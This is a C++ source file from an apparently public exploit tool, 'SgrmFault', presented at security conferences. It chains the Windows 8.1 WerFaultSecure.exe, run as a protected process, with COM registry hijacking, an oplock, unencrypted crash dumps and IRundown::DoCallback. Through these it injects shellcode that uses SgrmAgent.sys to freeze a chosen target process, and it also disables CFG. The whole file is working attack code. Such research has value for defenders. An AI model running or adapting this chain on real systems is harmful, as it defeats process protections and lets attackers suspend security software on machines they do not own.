#include "StdAfx.h"
#include "SgrmFault.h"
#include "registry.h"
#include "com.h"
#include "utils.h"


static
void
banner()
{
    wprintf(
        L"*******************************************************************************\n"
        L"*\tSgrmFault: WerFaultSecure & SgrmAgent.sys Process Impairment Chain\n"
        L"*\tExploit chain presented at REcon 2026 & DEF CON 34\n"
        L"*\tGitHub: https://www.github.com/lem0nSec/SgrmFault\n"
        L"*\tAngelo Frasca Caccia (lem0nSec_) & Alejandro Pinna\n"
        L"*******************************************************************************\n\n");

    Sleep(1000);
}

static
void
usage()
{
    wprintf(
        L"\n"
        L" -h\t: Show this help message\n"
        L" -p\t: AppContainer Process ID\n"
        L" -t\t: Target process name (case insensitive)\n"
    );
}

// This function uses WerFaultSecure.exe from Windows 8.1 to
// create an unencrypted crash dump of a process.
static
BOOL
GenerateUnencryptedCrashDump(_In_ DWORD ProcessId, _In_ DWORD ThreadId) {
    BOOL status = FALSE;
    STARTUPINFOEXA StartupInfoExA = { sizeof(StartupInfoExA) };
    PROCESS_INFORMATION ProcessInfo = {};
    HANDLE hFile{}, hEncFile{}, hEvent{};
    HANDLE hProcess{}, hThread{};
    std::string cmdLine{};

    hFile = CreateFile(
        L".\\dump.dmp",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error creating file: dump.dmp\n");
        goto Exit;
    }

    hEncFile = CreateFile(
        L".\\dump_enc.dmp",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hEncFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error creating file: dump_enc.dmp\n");
        goto Exit;
    }

    if (!SetHandleInformation(hFile, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on dump.dmp handle.\n");
        goto Exit;
    }

    if (!SetHandleInformation(hEncFile, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on dump_enc.dmp handle.\n");
        goto Exit;
    }

    hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!hEvent) {
        printf("[-] Error creating event.\n");
        goto Exit;
    }

    if (!SetHandleInformation(hEvent, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on event handle.\n");
        goto Exit;
    }

    cmdLine = ".\\werfaultsecure.exe /h /file " + std::to_string(HandleToUlong(hFile)) + " /pid "
        + std::to_string((int)ProcessId) + " /tid " + std::to_string(ThreadId) + " /type 2 " + "/encfile "
        + std::to_string(HandleToUlong(hEncFile))
        + " /cancel " + std::to_string(HandleToUlong(hEvent));
    status = CreateProcessAsPPL((LPSTR)cmdLine.c_str(), &StartupInfoExA, &ProcessInfo);
    if (!status) {
        printf("[-] Error creating WerFaultSecure.exe process as PPL : (0x % -04x)\n", GetLastError());
        goto Exit;
    }

    hProcess = ProcessInfo.hProcess;
    hThread = ProcessInfo.hThread;

    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

Exit:
    if (hEncFile) {
        CloseHandle(hEncFile);
    }
    if (hFile) {
        CloseHandle(hFile);
    }
    if (hEvent) {
        CloseHandle(hEvent);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }
    if (hThread) {
        CloseHandle(hThread);
    }

    return status;
}

// This function retrieves the data to 
// connect to the remote IRundown interface.
// Then prepares the shared section, connects
// to IRundown, and uses IRundown::DoCallback
// to inject and execute the shellcode in 
// WerFaultSecure.exe
static
BOOL
TriggerShellcodeExecution(
    _In_ PVOID pShellcode,
    _In_ DWORD dwShellcodeLength,
    _In_ PVOID pLocalSection,
    _In_ PVOID pPattern)
{
    // Shared section pointers
    WER_MAPPED_SECTION_PAYLOAD pLocalSectionMapping{};
    WER_MAPPED_SECTION_PAYLOAD pRemoteSectionMapping{};

    // IRundown data
    IR_PARAMETERS irundownParams{};
    XAptCallback docallbackParams{};

    BOOL status = FALSE;
    HMODULE hNtdll{};
    HMODULE hKernel32{};
    MODULE_SECTION_INFORMATION msInfo{};
    DWORD64 stackOffset = 0x1000 - 0x100; // Let's always keep the stack address 8-bit aligned
    PTRMEM pfnRtlCaptureContex = 0;
    PTRMEM pfnNtContinue = 0;
    DWORD64 pfnWriteProcessMemory = 0;

    if (!pLocalSection) {
        return 0;
    }

    hNtdll = GetModuleHandle(L"ntdll.dll");
    hKernel32 = GetModuleHandle(L"kernel32.dll");

    if (!ResolveModuleSectionBase(L"wer.dll", ".text", &msInfo)) {
        return 0;
    }

    if (!hNtdll ||
        !hKernel32 ||
        !msInfo.moduleBase) {
        return 0;
    }

    pfnRtlCaptureContex = (PTRMEM)GetProcAddress(hKernel32, "RtlCaptureContext");
    pfnNtContinue = (PTRMEM)GetProcAddress(hNtdll, "NtContinue");
    pfnWriteProcessMemory = (DWORD64)GetProcAddress(hKernel32, "WriteProcessMemory");
    if (!pfnRtlCaptureContex ||
        !pfnNtContinue ||
        !pfnWriteProcessMemory) {
        return 0;
    }

    if (!DumpInitializeUtils("dump.dmp")) {
        return 0;
    }

    if (!DumpGetIRundownParameters(&irundownParams)) {
        return 0;
    }

    printf("[+] IRundown parameters collected.\n");

    void* pRemoteSection{};
    if (!DumpGetRemoteSection(pPattern, /* truncating is safe here */ (ULONG)sizeof(RPC_CSTR), &pRemoteSection)) {
        return 0;
    }

    printf("[+] Remote section identified at 0x%-016p\n", pRemoteSection);

    IRundown* rndn{};
    rndn = (IRundown*)IRundownConnect(&irundownParams);
    if (!rndn) {
        printf("[-] Remote IRundown connection failed.\n");
        return 0;
    }

    printf("[+] IRundown connection successful: 0x%-016p\n", (void*)rndn);

    pLocalSectionMapping.sampleContext = (PCONTEXT)pLocalSection;
    pRemoteSectionMapping.sampleContext = (PCONTEXT)pRemoteSection;

    pLocalSectionMapping.shellcode = Add2Ptr(pLocalSection, sizeof(CONTEXT));
    pRemoteSectionMapping.shellcode = Add2Ptr(pRemoteSection, sizeof(CONTEXT));

    pLocalSectionMapping.stack = Add2Ptr(pLocalSection, stackOffset);
    pRemoteSectionMapping.stack = Add2Ptr(pRemoteSection, stackOffset);

    __try {

        pLocalSectionMapping.sampleContext->ContextFlags = CONTEXT_FULL;

        docallbackParams.guidProcessSecret = irundownParams.secretGUID;
        docallbackParams.pServerCtx = (PTRMEM)irundownParams.pContext;

        // First DoCallback cycle - RtlCaptureContext
        // RtlCaptureContext(pRemoteSectionMapping.sampleContext)
        docallbackParams.pfnCallback = pfnRtlCaptureContex;
        docallbackParams.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
        
        printf("[+] DoCallback 1.\n");
        
        HRESULT hr = rndn->DoCallback(&docallbackParams);
        if (FAILED(hr)) {
            printf("[-] DoCallback error: (0x%x)\n", hr);
            __leave;
        }

        printf("[+] Sample _CONTEXT saved:\n\tRIP: 0x%-016p\n\tRSP: 0x%-016p\n\tRBP: 0x%-016p\n",
            (void*)pLocalSectionMapping.sampleContext->Rip,
            (void*)pLocalSectionMapping.sampleContext->Rsp,
            (void*)pLocalSectionMapping.sampleContext->Rbp);

        // Setting up WriteProcessMemory parameters in the _CONTEXT
        // Setting RIP to be WriteProcessMemory
        pLocalSectionMapping.sampleContext->Rip = pfnWriteProcessMemory;

        // Parameter 1 - Current process
        pLocalSectionMapping.sampleContext->Rcx = -1;

        // Parameter 2 - Destination address is wer.dll's base
        pLocalSectionMapping.sampleContext->Rdx = (DWORD64)msInfo.sectionBase;

        // Parameter 3 - Source is the shellcode
        // bringing actual shellcode to the shared section
        RtlCopyMemory(pLocalSectionMapping.shellcode, pShellcode, dwShellcodeLength);
        pLocalSectionMapping.sampleContext->R8 = (DWORD64)pRemoteSectionMapping.shellcode;

        // Parameter 4 - Size of the shellcode
        pLocalSectionMapping.sampleContext->R9 = dwShellcodeLength;

        // Parameter 5 (NULL) + return address
        // return address on the fake stack is wer's .text section
        memset(pLocalSectionMapping.stack, 0, 100);
        RtlCopyMemory(pLocalSectionMapping.stack, &msInfo.sectionBase, sizeof(PVOID));
        pLocalSectionMapping.sampleContext->Rsp = (DWORD64)pRemoteSectionMapping.stack;
        pLocalSectionMapping.sampleContext->Rbp = (DWORD64)pRemoteSectionMapping.stack;

        // Second DoCallback cycle - WriteProcessMemory
        // WriteProcessMemory(GetCurrentProcess(), WerTextBase, shellcode, sizeof(shellcode), NULL)
        docallbackParams.pfnCallback = pfnNtContinue;

        printf("[+] DoCallback 2. Firing shellcode & waiting...\n");
        
        hr = rndn->DoCallback(&docallbackParams);
        rndn->Release();

        status = TRUE;
    }
    __except (GetExceptionCode()) {
        goto exit;
    }

exit:
    return status;

}

int wmain(int argc, wchar_t* argv[])
{
    DWORD AppContainerProcessId = 0;
    const wchar_t* TargetProcessName = nullptr;

    if (argc < 2) {
        usage();
        return 0;
    }

    for (int i = 1; i < argc; ++i) {
        if (!wcscmp(argv[i], L"-h")) {
            usage();
            return 0;
        }
        else if (!wcscmp(argv[i], L"-p") && i + 1 < argc)
            AppContainerProcessId = wcstoul(argv[++i], nullptr, 0);
        else if (!wcscmp(argv[i], L"-t") && i + 1 < argc)
            TargetProcessName = argv[++i];
    }

    if (TargetProcessName == nullptr ||
        AppContainerProcessId <= 0) {
        usage();
        return 0;
    }


    PVOID pShellcode = nullptr;
    DWORD dwShellcodeLength = 0;
    HANDLE hFile{};
    OVERLAPPED overlapped{};
    HANDLE hFileMap{};
    void* pLocalSharedSection = nullptr;
    PWER_MAPPED_SECTION_HEADER pSectionHeader = nullptr;
    UUID Uuid{};
    char* randomGuid{};
    HANDLE hProcess{};
    std::string cmdLine{};
    STARTUPINFOEXA StartupInfo{};
    PROCESS_INFORMATION ProcessInfo{};
    DWORD dwBytes = 0;

    banner();

    if (!EnableCurrentProcessPrivilege(L"SeDebugPrivilege")) {
        printf("[-] Privilege error. Aborting...\n");
        return 0;
    }

    printf("[+] SeDebugPrivilege ok\n");

    // We create the shellcode for SgrmAgent.sys. This is
    // the payload that will be executed by WerFaultSecure.exe.
    // It is responsible for establishing a communication channel with
    // the driver, and freezing the process we specify below as first parameter.
    if (!AllocateSgrmShellcode(TargetProcessName, &pShellcode, &dwShellcodeLength) ||
        !pShellcode ||
        !dwShellcodeLength ||
        dwShellcodeLength < 0) {
        printf("[-] Error allocating SGRM shellcode. Is %ws running?\n", TargetProcessName);
        return 0;
    }

    printf("[+] SGRM Shellcode of size %d ready at 0x%-016p\n", dwShellcodeLength, pShellcode);

    // We change the ownership and permissions of HKLM\Software\Classes\CLSID\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\InProcServer32 to be able to modify it.
    if (!RegKeyChangeOwner(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}")) {
        printf("[-] Error changing TwinAPI CLSID Reg Key owner.\n");
        return 0;
    }

    if (!RegKeyChangeOwner(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32")) {
        printf("[-] Error changing TwinAPI CLSID InProcServer32 Reg Key owner.\n");
        return 0;
    }

    if (!RegKeyChangePermissions(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32")) {
        printf("[-] Error changing TwinAPI Reg Key permissions\n");
        return 0;
    }

    // CFG must be disabled for WerFaultSecure to be able to
    // execute the shellcode
    if (!DisableProcessCFG(L"WerFaultSecure.exe")) {
        printf("[-] Error disabling CFG for WerFaultSecure.exe\n");
        return 0;
    }

    // We change the value of InProcServer32\(Default) to point to the file C:\Windows\System32\license.rtf which we later oplocked.
    // So the COM server interface is initialized and locked at the right time.
    if (!RegKeySetValue(
        L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
        NULL,
        REG_SZ,
        fileToLock,
        (DWORD)((wcslen(fileToLock) + 1) * sizeof(wchar_t)))) {
        printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
        return 0;
    }

    // We change the value of InProcServer32\ThreadingModel to 'Free' so the IRundown interface is initialized.
    if (!RegKeySetValue(
        L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
        L"ThreadingModel",
        REG_SZ,
        STAData,
        (DWORD)((wcslen(STAData) + 1) * sizeof(wchar_t)))) {
        printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
        return 0;
    }

    hFile = SetOplockOnFile(fileToLock, &overlapped);
    if (!hFile) {
        printf("[-] Error setting oplock on %ws\n", fileToLock);
        return 0;
    }

    // We create a section object from our exploit process.
    // This section will later be shared with WerFaultSecure,
    // and it is where write parameters for DoCallback and shellcode
    hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, 0, 4096, nullptr);
    if (!hFileMap) {
        printf("[-] Error creating section.\n");
        return 0;
    }

    printf("[+] Section object created: 0x%lx\n", HandleToUlong(hFileMap));

    // We create a mapping view of the section. Once WerFaultSecure.exe also
    // maps it, anything that we write into the section from the exploit process
    // will be reflected into WerFaultSecure mapping view.
    pLocalSharedSection = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!pLocalSharedSection) {
        printf("[-] Error mapping section object.\n");
        goto Exit;
    }

    printf("[+] Section mapped in local process: 0x%-016p\n", pLocalSharedSection);

    // We create a random GUID that enables us to find the shared section later in the WerFaultSecure dump
    // Ref. https://stackoverflow.com/questions/24365331/how-can-i-generate-uuid-in-c-without-using-boost-library
    if (UuidCreate(&Uuid) != RPC_S_OK) {
        printf("[-] Error generating tracking UUID.\n");
        goto Exit;
    }

    if (UuidToStringA(&Uuid, (RPC_CSTR*)&randomGuid) != RPC_S_OK) {
        printf("[-] Error generating tracking UUID.\n");
        goto Exit;
    }

    printf("[+] Random GUID generated: %s\n", randomGuid);

    // Setting up shared section with the required data...
    // These values have been obtained by reversing faultrep!CCrashReport::LoadCrashData
    // The method checks the values written to the shared section, so if we don't specify these values, the exploit won't work.
    // The values come from the following binary:
    // faultrep.dll version 6.3.9600.17415 (winblue_r4.141028-1500)
    // Sha1 hash: B241A5B14F8A8E478B27CB79B7552F00AA01C538
    pSectionHeader = (PWER_MAPPED_SECTION_HEADER)pLocalSharedSection;
    pSectionHeader->Unk = 0x00F8;
    pSectionHeader->ProcessId = AppContainerProcessId;
    RtlCopyMemory(&pSectionHeader->Cookie, randomGuid, sizeof(RPC_CSTR));
    for (unsigned int i = sizeof(WER_MAPPED_SECTION_HEADER); i < 4096; i++) {
        *(PBYTE)Add2Ptr(pLocalSharedSection, i) = 0x41;
    }

    // Open inheritable handle to the AppContainer process.
    // This is just a random AppContainer process that's required to
    // lead WerFaultSecure to initialize COM and IRundown
    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, AppContainerProcessId);
    if (hProcess == INVALID_HANDLE_VALUE || !hProcess) {
        printf("[-] Error opening AppContainer process: (0x%-04x)\n", GetLastError());
        goto Exit;
    }

    printf("[+] Opened inheritable handle to AppContainer process: 0x%lx\n", HandleToUlong(hProcess));

    // Copy the handle to the process to the shared section
    RtlCopyMemory(Add2Ptr(pLocalSharedSection, (0xc0 - sizeof(HANDLE))), &hProcess, 8);
    RtlSecureZeroMemory(Add2Ptr(pLocalSharedSection, 0xc0), 24);

    if (hFileMap == nullptr) {
        printf("[-] Section is null\n");
        goto Exit;
    }

    // Setting inheritability on the exploit's section object handle.
    // So WerFaultSecure will be able to use it.
    if (!SetHandleInformation(hFileMap, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on section handle.\n");
        goto Exit;
    }

    printf("[+] Section object is now inheritable.\n");

    // Create WerFaultSecure.exe process as PPL with the command line argument -s
    // -s is a handle to a section object that we want WerFaultSecure to map.
    cmdLine = ".\\werfaultsecure.exe -u -s " + std::to_string(HandleToUlong(hFileMap)) + " -p " + std::to_string(AppContainerProcessId);
    StartupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    if (!CreateProcessAsPPL((LPSTR)cmdLine.c_str(), &StartupInfo, &ProcessInfo)) {
        printf("[-] Error creating WerFaultSecure.exe process as PPL: (0x%-04x)\n", GetLastError());
        goto Exit;
    }

    printf("[+] Spawned WerFaultSecure: %d - Waiting for overlapped result...\n", ProcessInfo.dwProcessId);

    // This call will halt the current thread until someone accesses the locked file.
    // We expect WerFaultSecure.exe to access 'C:\Windows\System32\license.rtf'.
    if (!GetOverlappedResult(hFile, &overlapped, &dwBytes, TRUE)) {
        printf("Oplock Failed. Aborting...\n");
        goto Exit;
    }

    printf("[+] Oplock fired! Dumping WerFaultSecure.exe...\n");

    // WerFaultSecure.exe here is stuck for as long as we hold the handle to license.rtf
    // At this point, IRundown is intitialized in the COM server, happy to serve requests :)
    // We first dump WerFaultSecure to get the required IRundown connection parameters from it.
    if (!GenerateUnencryptedCrashDump(ProcessInfo.dwProcessId, ProcessInfo.dwThreadId)) {
        goto Exit;
    }
    
    // We trigger the injection here...
    // Param 1. SGRM Shellcode
    // Param 2. Shellcode size
    // Param 3. Pointer to shared section in current process
    // Param 4. Pattern in the shared section. This is to locate the shared section in the dump of the remote WerFaultSecure
    if (!TriggerShellcodeExecution(
        pShellcode,
        dwShellcodeLength,
        pLocalSharedSection,
        randomGuid)) {
        goto Exit;
    }

    // We hold the lock to license.rtf as long as werfaultsecure.exe lives
    // So we keep the COM server exposing th IRundown interface always alive
    // We expect our own shellcode to call TerminateProcess() once finishes its job
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    printf("[+] Complete.\n");

Exit:
    if (pLocalSharedSection) {
        UnmapViewOfFile(pLocalSharedSection);
    }
    if (hFile) {
        CloseHandle(hFile);
    }
    if (hFileMap) {
        CloseHandle(hFileMap);
    }
    if (ProcessInfo.hProcess) {
        CloseHandle(ProcessInfo.hProcess);
    }
    if (ProcessInfo.hThread) {
        CloseHandle(ProcessInfo.hThread);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }

    FreeSgrmShellcode();

    return 0;
}
